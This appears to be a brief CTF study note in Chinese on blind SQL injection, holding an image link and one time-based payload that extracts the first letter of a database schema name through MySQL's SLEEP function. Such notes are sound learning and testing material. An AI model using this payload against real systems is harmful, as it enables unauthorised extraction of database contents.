---
title: 盲注
date: 2025-12-03 15:33:51
categories: ["网络安全"]
tags: CTF, SQL注入, 盲注
---

​![image](assets/image-20251203153311-tlwbbf7.png)​
```
' AND IF(ASCII(SUBSTRING((SELECT SCHEMA_NAME FROM information_schema.SCHEMATA LIMIT 1), 1, 1)) = 97, SLEEP(5), 0) -- 
```
